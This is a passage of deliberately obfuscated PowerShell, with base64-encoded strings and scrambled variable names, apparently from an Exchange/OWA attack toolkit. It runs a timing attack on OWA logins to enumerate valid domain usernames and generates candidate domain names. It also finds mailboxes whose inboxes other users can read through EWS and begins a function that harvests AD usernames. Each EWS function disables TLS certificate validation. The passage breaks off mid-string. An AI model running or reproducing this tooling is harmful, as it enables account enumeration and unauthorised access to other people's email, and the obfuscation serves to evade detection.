	Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAcABvAG4AcwBlACAAVABpAG0AZQAgACgATQBTACkAIAAJACAARABvAG0AYQBpAG4AXABVAHMAZQByAG4AYQBtAGUA')))
    ForEach($Username in ${______/=\__/\/\__})
    {
        ${/=\/\_/===\__/\/\} = $Domain + "\" + $Username
        $ProgressPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAGwAZQBuAHQAbAB5AGMAbwBuAHQAaQBuAHUAZQA=')))
        ${/==\_/\/=\/=\_/\_} = @{destination=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGYAMwB9AA==')));flags='4';forcedownlevel='0';username=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADMAOQB9AA==')));password=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABQAGEAcwBzAHcAbwByAGQA')));isUtf8='1'}
        ${_/==\_/==\____/==} = [system.diagnostics.stopwatch]::startNew()
        ${_/\/=\_/=\__/\/\/} = iwr -Uri ${_/=\/=====\__/\_/=} -Method POST -Body ${/==\_/\/=\/=\_/\_} -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
        ${/========\/==\_/\} = [double]${_/==\_/==\____/==}.ElapsedMilliseconds
		Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADMAfQAgAAkACQAJACAAJAB7ADMAOQB9AA==')))
		if (${/========\/==\_/\} -le ${_/=\/\_/====\/==\})
        {
            Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAG8AdABlAG4AdABpAGEAbABsAHkAIABWAGEAbABpAGQAIQAgAFUAcwBlAHIAOgAkAHsAMwA5AH0A')))
            ${_/\/\/\/===\_/=\_} += ${/=\/\_/===\__/\/\}
        }
    }
    Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBACAAdABvAHQAYQBsACAAbwBmACAA'))) + ${_/\/\/\/===\_/=\_}.count + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABwAG8AdABlAG4AdABpAGEAbABsAHkAIAB2AGEAbABpAGQAIAB1AHMAZQByAG4AYQBtAGUAcwAgAGYAbwB1AG4AZAAuAA=='))))
    if ($OutFile -ne "")
       {
            ${_/\/\/\/===\_/=\_} | Out-File -Encoding ascii $OutFile
            Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAcwAgAGgAYQB2AGUAIABiAGUAZQBuACAAdwByAGkAdAB0AGUAbgAgAHQAbwAgACQATwB1AHQARgBpAGwAZQAuAA==')))
       }
}
function ____/\_/===\_/\_/= {
    Param(
    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    ${_/==\/=\__/=======} = ""
    )
    Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGEAdABpAG4AZwAgAGQAbwBtAGEAaQBuACAAbgBhAG0AZQBzAC4ALgAuAA==')))
    ${__/\/\/=\/==\_/=\} = @()
    ${______/==\_____/=} = ( (${_/==\/=\__/=======}.ToUpper() -ne ${_/==\/=\__/=======}) -and (${_/==\/=\__/=======}.ToLower() -ne ${_/==\/=\__/=======}) )
    ${/=\/\/\___/\/=\_/} = ${_/==\/=\__/=======}.Contains(" ")
    if( (-not ${______/==\_____/=}) -and (-not ${/=\/\/\___/\/=\_/}) ) {
        return @()
    }
    if( ${______/==\_____/=} ) {
        ${_/==\/=\__/=======} = $(${_/==\/=\__/=======}.substring(0,1).toupper() + ${_/==\/=\__/=======}.substring(1) -creplace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBBAC0AWgBdAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAkACYA')))).Trim()
    }
    ${/===\/=\_/\__/\/\} = ${_/==\/=\__/=======}.Split(" ")
    ${_/=\/====\/=\/\__} = ""
    ${/===\/=\_/\__/\/\} | ForEach {
        ${_/=\/====\/=\/\__} += $_.Substring(0,1)
    }
    ${__/\/\/=\/==\_/=\} += ${_/=\/====\/=\/\__}
    ${__/\/\/=\/==\_/=\} += ${/===\/=\_/\__/\/\}[0]
    ${_/\__/=\_/=====\_} = ${/===\/=\_/\__/\/\}.Length
    for(${_/\/==\___/=\_/\_}=0; ${_/\/==\___/=\_/\_} -lt (${_/\__/=\_/=====\_}-1); ${_/\/==\___/=\_/\_}++) {
        ${/=\/\/=\__/=\_/==} = ${/===\/=\_/\__/\/\}[${_/\/==\___/=\_/\_}]
        for(${__/=\/=\_/=\/==\_}=${_/\/==\___/=\_/\_}+1; ${__/=\/=\_/=\/==\_} -lt ${_/\__/=\_/=====\_}; ${__/=\/=\_/=\/==\_}++) {
            ${/=\/\/=\__/=\_/==} += ${/===\/=\_/\__/\/\}[${__/=\/=\_/=\/==\_}]
            ${__/\/\/=\/==\_/=\} += ${/=\/\/=\__/=\_/==}
        }
    }
    ${/=\/\/=\__/\__/=\}=@($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0A'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAHIAcAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBpAHoA'))))
    ${/==\/\/\/=\/\__/\} = @()
    ForEach(${_/==\/=\__/=======} in ${__/\/\/=\/==\_/=\}) {
        ForEach(${____/=\/\/==\_/==} in ${/=\/\/=\__/\__/=\}) {
            ${/==\/\/\/=\/\__/\} += ${_/==\/=\__/=======} + "." + ${____/=\/\/==\_/==}
        }
    }
    ${__/\/\/=\/==\_/=\} += ${/==\/\/\/=\/\__/\}
    ${__/\/\/=\/==\_/=\} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAHIAcAA=')))
    ${__/\/\/=\/==\_/=\} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHQAZQByAG4AYQBsAA==')))
    Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AcwA6ACAAJAB7ADEANAA0AH0A')))
    Write-Host ""
    return ${__/\/\/=\/==\_/=\}
}
function _/=====\/\__/\_/== {
    Param(
    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    ${_/=\/=====\__/\_/=} = "",
    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    ${_/===\__/==\_/\/==} = "",
    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $Domain = ""
    )
    ${______/=\__/\/\__} = @()
    for(${_/\/==\___/=\_/\_} = 0; ${_/\/==\___/=\_/\_} -lt 5; ${_/\/==\___/=\_/\_}++) {
        ${_____/\/===\__/\_} = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
        if( $Domain -eq "" ) {
            ${__/\/\__/=\/==\/=} = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
            ${______/=\__/\/\__} += ${__/\/\__/=\/==\/=} + "\" + ${_____/\/===\__/\_}
        }
        else {
            ${______/=\__/\/\__} += $Domain + "\" + ${_____/\/===\__/\_}
        }
    }
    $Password = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
    ${/==\_/====\_/==\/} = 0.0
    ${____/==\__/==\_/\} = 0.0
    Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAZQByAG0AaQBuAGkAbgBnACAAYgBhAHMAZQBsAGkAbgBlACAAcgBlAHMAcABvAG4AcwBlACAAdABpAG0AZQAuAC4ALgA=')))
	Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAcABvAG4AcwBlACAAVABpAG0AZQAgACgATQBTACkAIAAJACAARABvAG0AYQBpAG4AXABVAHMAZQByAG4AYQBtAGUA')))
    ForEach($Username in ${______/=\__/\/\__})
    {
        $ProgressPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAGwAZQBuAHQAbAB5AGMAbwBuAHQAaQBuAHUAZQA=')))
        ${/==\_/\/=\/=\_/\_} = @{destination=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGYAMwB9AA==')));flags='4';forcedownlevel='0';username=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABVAHMAZQByAG4AYQBtAGUA')));password=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABQAGEAcwBzAHcAbwByAGQA')));isUtf8='1'}
        ${_/\/=\_/=\__/\/\/} = iwr -Uri ${_/=\/=====\__/\_/=} -Method POST -Body ${/==\_/\/=\/=\_/\_} -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
        ${_/==\_/==\____/==} = [system.diagnostics.stopwatch]::startNew()
        ${_/\/=\_/=\__/\/\/} = iwr -Uri ${_/=\/=====\__/\_/=} -Method POST -Body ${/==\_/\/=\/=\_/\_} -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
        ${/========\/==\_/\} = [double]${_/==\_/==\____/==}.ElapsedMilliseconds
		Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADMAfQAgAAkACQAJACAAJAB1AHMAZQByAG4AYQBtAGUA')))
        ${____/==\__/==\_/\} += 1.0
        ${/==\_/====\_/==\/} += ${/========\/==\_/\}
    }
    ${/==\_/====\_/==\/} /= ${____/==\__/==\_/\}
    Write-Host ""
    Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CQAgAEIAYQBzAGUAbABpAG4AZQAgAFIAZQBzAHAAbwBuAHMAZQA6ACAAJAB7ADEAfQA=')))
    Write-Host ""
    return ${/==\_/====\_/==\/}
}
function Invoke-OpenInboxFinder{
  Param(
    [Parameter(Position = 0, Mandatory = $False)]
    [string]
    $Mailbox = "",
    [Parameter(Position = 1, Mandatory = $False)]
    [system.URI]
    $ExchHostname = "",
    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $OutFile = "",
    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $ExchangeVersion = "Exchange2010",
    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $EmailList = "",
    [Parameter(Position = 5, Mandatory = $False)]
    [switch]
    $AllPerms,
    [Parameter(Position = 6, Mandatory = $False)]
    [switch]
    $Remote 
  )
  __/=\_/==\___/\___
  $ErrorActionPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAGwAZQBuAHQAbAB5AGMAbwBuAHQAaQBuAHUAZQA='))) 
  ${__/====\/=\____/=} = @()
  If ($EmailList -ne "") 
  {
    ${__/====\/=\____/=} = gc -Path $EmailList
    $Mailbox = ${__/====\/=\____/=}[0]
  } 
  elseif ($Mailbox -ne "")
  {
    ${__/====\/=\____/=} = $Mailbox
  }
  echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAHIAeQBpAG4AZwAgAEUAeABjAGgAYQBuAGcAZQAgAHYAZQByAHMAaQBvAG4AIAAkAEUAeABjAGgAYQBuAGcAZQBWAGUAcgBzAGkAbwBuAA==')))
  ${____/====\/\/=\__} = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion
  ${/==\/\_______/\/=} = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService(${____/====\/\/=\__})
  if ($Remote)
  {
    ${_/==\__/====\__/=} = Get-Credential
    ${/==\/\_______/\/=}.UseDefaultCredentials = $false
    ${/==\/\_______/\/=}.Credentials = ${_/==\__/====\__/=}.GetNetworkCredential()
  }
  else
  {
    ${/==\/\_______/\/=}.UseDefaultCredentials = $true
  }
  ${/==\__/=\/\/=\_/=}=New-Object Microsoft.CSharp.CSharpCodeProvider
  ${/\_____/=\__/\__/}=${/==\__/=\/\/=\_/=}.CreateCompiler()
  ${__/\/\_/\_/\_/\__}=New-Object System.CodeDom.Compiler.CompilerParameters
  ${__/\/\_/\_/\_/\__}.GenerateExecutable=$False
  ${__/\/\_/\_/\_/\__}.GenerateInMemory=$True
  ${__/\/\_/\_/\_/\__}.IncludeDebugInformation=$False
  ${__/\/\_/\_/\_/\__}.ReferencedAssemblies.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAEwATAA=')))) > $null
  ${__/=\/\_/===\__/=}=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIABuAGEAbQBlAHMAcABhAGMAZQAgAEwAbwBjAGEAbAAuAFQAbwBvAGwAawBpAHQARQB4AHQAZQBuAHMAaQBvAG4AcwAuAE4AZQB0AC4AQwBlAHIAdABpAGYAaQBjAGEAdABlAFAAbwBsAGkAYwB5AHsADQAKACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVAByAHUAcwB0AEEAbABsACAAOgAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBJAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBQAG8AbABpAGMAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAFQAcgB1AHMAdABBAGwAbAAoACkAIAB7ACAADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABiAG8AbwBsACAAQwBoAGUAYwBrAFYAYQBsAGkAZABhAHQAaQBvAG4AUgBlAHMAdQBsAHQAKABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQAIABzAHAALAANAAoAIAAgACAAIAAgACAAIAAgACAAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AWAA1ADAAOQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAuAFgANQAwADkAQwBlAHIAdABpAGYAaQBjAGEAdABlACAAYwBlAHIAdAAsACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAByAGUAcQAsACAAaQBuAHQAIABwAHIAbwBiAGwAZQBtACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAdAByAHUAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAB9AA=='))) 
  ${_/=\_/\_/=\___/\_}=${/==\__/=\/\/=\_/=}.CompileAssemblyFromSource(${__/\/\_/\_/\_/\__},${__/=\/\_/===\__/=})
  ${_/\_/======\__/==}=${_/=\_/\_/=\___/\_}.CompiledAssembly
  ${__/\_/==\________}=${_/\_/======\__/==}.CreateInstance($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAC4AVABvAG8AbABrAGkAdABFAHgAdABlAG4AcwBpAG8AbgBzAC4ATgBlAHQALgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUABvAGwAaQBjAHkALgBUAHIAdQBzAHQAQQBsAGwA'))))
  [System.Net.ServicePointManager]::CertificatePolicy=${__/\_/==\________}
  if ($ExchHostname -ne "")
  {
    ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAaQBuAGcAIABFAFcAUwAgAFUAUgBMACAA'))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBFAFcAUwAvAEUAeABjAGgAYQBuAGcAZQAuAGEAcwBtAHgA'))))
    ${/==\/\_______/\/=}.Url = new-object System.Uri(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBFAFcAUwAvAEUAeABjAGgAYQBuAGcAZQAuAGEAcwBtAHgA')))))
  }
  else
  {
    ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAHUAdABvAGQAaQBzAGMAbwB2AGUAcgBpAG4AZwAgAGUAbQBhAGkAbAAgAHMAZQByAHYAZQByACAAZgBvAHIAIAA='))) + $Mailbox + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAuAC4A'))))
    ${/==\/\_______/\/=}.AutoDiscoverUrl($Mailbox, {$true})
  }    
    try
    {  
    ${/==\/=\_/\__/\/\/} = [Microsoft.Exchange.WebServices.Data.Folder]::Bind(${/==\/\_______/\/=},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBzAGcARgBvAGwAZABlAHIAUgBvAG8AdAA=')))) 
    }
    catch
    {
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABMAG8AZwBpAG4AIABhAHAAcABlAGEAcgBzACAAdABvACAAaABhAHYAZQAgAGYAYQBpAGwAZQBkAC4AIABUAHIAeQAgAHQAaABlACAALQBSAGUAbQBvAHQAZQAgAGYAbABhAGcAIABhAG4AZAAgAGUAbgB0AGUAcgAgAHYAYQBsAGkAZAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAHcAaABlAG4AIABwAHIAbwBtAHAAdABlAGQALgA=')))
    break
    }
    ${/=\_/\_/\/==\/\_/} = 0
    ${/=\/====\_/\/=\/\} = ${__/====\/=\____/=}.count
    ${/===\____/==\/\__} = @()
    echo "`n`r"
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABDAGgAZQBjAGsAaQBuAGcAIABmAG8AcgAgAGEAbgB5ACAAcAB1AGIAbABpAGMAIABmAG8AbABkAGUAcgBzAC4ALgAuAA==')))
    echo "`n`r"
    ${_/\/=\/==\/===\_/} = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
    ${_/\/=\/==\/===\_/}.Add([Microsoft.Exchange.WebServices.Data.FolderSchema]::Permissions)
    ${/=\/=====\/=\/==\} = new-object Microsoft.Exchange.WebServices.Data.ExtendedPropertyDefinition(26293, [Microsoft.Exchange.WebServices.Data.MapiPropertyType]::String);    
    ${_/\/=\/==\/===\_/}.Add(${/=\/=====\/=\/==\})  
    ${_/\___/===\/\__/\} = [Microsoft.Exchange.WebServices.Data.Folder]::Bind(${/==\/\_______/\/=},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMARgBvAGwAZABlAHIAcwBSAG8AbwB0AA=='))),${_/\/=\/==\/===\_/}) 
    ${/=======\/\/==\/\} = [Microsoft.Exchange.WebServices.Data.FolderView]100
    ${_/\___/===\/\__/\}.Load()
    ${__/==\_/=\/\/=\/=} = ${_/\___/===\/\__/\}.FindFolders(${/=======\/\/==\/\}) 
    ${___/\___/=\__/=\_} = @()
    ${_/\___/===\/\__/\} = @()
    Foreach(${/=\____/=\/\/=\/\} in ${__/==\_/=\/\/=\/=}.Folders)
    {
        echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHUAbgBkACAAcAB1AGIAbABpAGMAIABmAG8AbABkAGUAcgA6ACAA'))) + ${/=\____/=\/\/=\/\}.DisplayName)
    }
    ${_/\___/===\/\__/\}
    echo "`n`r"
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABDAGgAZQBjAGsAaQBuAGcAIABhAGMAYwBlAHMAcwAgAHQAbwAgAG0AYQBpAGwAYgBvAHgAZQBzACAAZgBvAHIAIABlAGEAYwBoACAAZQBtAGEAaQBsACAAYQBkAGQAcgBlAHMAcwAuAC4ALgA=')))
    echo "`n`r"
    foreach(${_/\___/=\___/===\} in ${__/====\/=\____/=})
    {
        Write-Host -nonewline $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMwAyAH0AIABvAGYAIAAkAHsAMwA2AH0AIABtAGEAaQBsAGIAbwB4AGUAcwAgAGMAaABlAGMAawBlAGQADQA='))) 
        ${/=\_/\_/\/==\/\_/} += 1
        ${_/\/====\/\/=\___} = ""
        ${/=\___/===\/=\_/=} = New-Object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox,${_/\___/=\___/===\})
        ${___/=\/\_________} = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
        ${___/=\/\_________}.Add([Microsoft.Exchange.WebServices.Data.FolderSchema]::Permissions)
        ${_/\/====\/\/=\___} = [Microsoft.Exchange.WebServices.Data.Folder]::Bind(${/==\/\_______/\/=},${/=\___/===\/=\_/=},${___/=\/\_________})
        ${_/\/=\__/=\/\/\_/} = New-Object Microsoft.Exchange.WebServices.Data.ItemView(1)
        try
        {
            ${_/=\___/=\/=\_/\/} = ${/==\/\_______/\/=}.FindItems(${_/\/====\/\/=\___}.Id,${_/\/=\__/=\/\/\_/})  
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABTAFUAQwBDAEUAUwBTACEAIABJAG4AYgBvAHgAIABvAGYAIAAkAHsAMQAyADQAfQAgAGkAcwAgAHIAZQBhAGQAYQBiAGwAZQAuAA==')))
            ${__/=\_/=\/=====\_} = ${_/\/====\/\/=\___}.Permissions
            if ($AllPerms)
            {
                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAIABQAGUAcgBtAGkAcwBzAGkAbwBuACAAUwBlAHQAdABpAG4AZwBzACAAZgBvAHIAIABJAG4AYgBvAHgAIABvAGYAIAAkAHsAMQAyADQAfQA=')))
                ${__/=\_/=\/=====\_}
            }
            else
            {
                foreach (${/==\_/\__/==\_/\_} in ${__/=\_/=\/=====\_})
                {
                    if (${/==\_/\__/==\_/\_}.UserId.StandardUser -ne $null)
                    {
                        echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABlAHIAbQBpAHMAcwBpAG8AbgAgAGwAZQB2AGUAbAAgAGYAbwByACAA'))) + ${/==\_/\__/==\_/\_}.UserId.StandardUser + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABzAGUAdAAgAHQAbwA6ACAA'))) + ${/==\_/\__/==\_/\_}.PermissionLevel)
                    }
                    else
                    {
                        echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABlAHIAbQBpAHMAcwBpAG8AbgAgAGwAZQB2AGUAbAAgAGYAbwByACAA'))) + ${/==\_/\__/==\_/\_}.UserId.DisplayName + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABzAGUAdAAgAHQAbwA6ACAA'))) + ${/==\_/\__/==\_/\_}.PermissionLevel)
                    }
                }
            }
            echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAagBlAGMAdAAgAG8AZgAgAGwAYQB0AGUAcwB0ACAAZQBtAGEAaQBsACAAaQBuACAAaQBuAGIAbwB4ADoAIAA='))) + ${_/=\___/=\/=\_/\/}.Subject)
            ${/===\____/==\/\__} += ${_/\___/=\___/===\}
        }
        catch
      {
        ${/=\__/\_/\/==\/=\} = $_.Exception.Message
        continue
      }
    }
    if ($OutFile -ne "")
    {
      ${/===\____/==\/\__} | Out-File -Encoding ascii $OutFile
    }
}
function Get-ADUsernameFromEWS{
  Param(
    [Parameter(Position = 0, Mandatory = $False)]
    [system.URI]
    $ExchHostname = "",
    [Parameter(Position = 1, Mandatory = $False)]
    [string]
    $OutFile = "",
    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $ExchangeVersion = "Exchange2010_SP2",
    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $EmailList = "",
    [Parameter(Position = 4, Mandatory = $False)]
    [switch]
    $Remote,
    [Parameter(Position=5, Mandatory=$false)] 
    [string]
    $EmailAddress,
    [Parameter(Position=6, Mandatory=$False)]
    [switch]
    $Partial,
    [Parameter(Position=7, Mandatory=$False)]
    [switch]
    $AliasOnly
  )
  __/=\_/==\___/\___
  $ErrorActionPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAGwAZQBuAHQAbAB5AGMAbwBuAHQAaQBuAHUAZQA=')))
  if (($EmailList -eq "") -and ($EmailAddress -eq ""))
    {
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABFAGkAdABoAGUAcgAgAGEAbgAgAEUAbQBhAGkAbABMAGkAcwB0ACAAbwByACAAYQAgAHMAaQBuAGcAbABlACAARQBtAGEAaQBsAEEAZABkAHIAZQBzAHMAIABtAHUAcwB0ACAAYgBlACAAcwBwAGUAYwBpAGYAaQBlAGQALgA=')))
    break
    }
  If ($EmailList -ne "") 
  {
    ${___/\/\_/\/=\/=\/} = gc -Path $EmailList
    $EmailAddress = ${___/\/\_/\/=\/=\/}[0]
  } 
  elseif (${___/\/\_/\/=\/=\/} -ne "")
  {
    ${___/\/\_/\/=\/=\/} = $EmailAddress
  }
  echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAHIAeQBpAG4AZwAgAEUAeABjAGgAYQBuAGcAZQAgAHYAZQByAHMAaQBvAG4AIAAkAEUAeABjAGgAYQBuAGcAZQBWAGUAcgBzAGkAbwBuAA==')))
  ${____/====\/\/=\__} = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion
  ${/==\/\_______/\/=} = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService(${____/====\/\/=\__})
  if ($Remote)
  {
    ${_/==\__/====\__/=} = Get-Credential
    ${/==\/\_______/\/=}.UseDefaultCredentials = $false
    ${/==\/\_______/\/=}.Credentials = ${_/==\__/====\__/=}.GetNetworkCredential()
  }
  else
  {
    ${/==\/\_______/\/=}.UseDefaultCredentials = $true
  }
  ${/==\__/=\/\/=\_/=}=New-Object Microsoft.CSharp.CSharpCodeProvider
  ${/\_____/=\__/\__/}=${/==\__/=\/\/=\_/=}.CreateCompiler()
  ${__/\/\_/\_/\_/\__}=New-Object System.CodeDom.Compiler.CompilerParameters
  ${__/\/\_/\_/\_/\__}.GenerateExecutable=$False
  ${__/\/\_/\_/\_/\__}.GenerateInMemory=$True
  ${__/\/\_/\_/\_/\__}.IncludeDebugInformation=$False
  ${__/\/\_/\_/\_/\__}.ReferencedAssemblies.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAEwATAA=')))) > $null
  ${__/=\/\_/===\__/=}=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIABuAGEAbQBlAHMAcABhAGMAZQAgAEwAbwBjAGEAbAAuAFQAbwBvAGwAawBpAHQARQB4AHQAZQBuAHMAaQBvAG4AcwAuAE4AZQB0AC4AQwBlAHIAdABpAGYAaQBjAGEAdABlAFAAbwBsAGkAYwB5AHsADQAKACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVAByAHUAcwB0AEEAbABsACAAOgAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBJAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBQAG8AbABpAGMAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAFQAcgB1AHMAdABBAGwAbAAoACkAIAB7ACAADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABiAG8AbwBsACAAQwBoAGUAYwBrAFYAYQBsAGkAZABhAHQAaQBvAG4AUgBlAHMAdQBsAHQAKABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQAIABzAHAALAANAAoAIAAgACAAIAAgACAAIAAgACAAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AWAA1ADAAOQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAuAFgANQAwADkAQwBlAHIAdABpAGYAaQBjAGEAdABlACAAYwBlAHIAdAAsACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAByAGUAcQAsACAAaQBuAHQAIABwAHIAbwBiAGwAZQBtACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAdAByAHUAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAfQANAAoAIA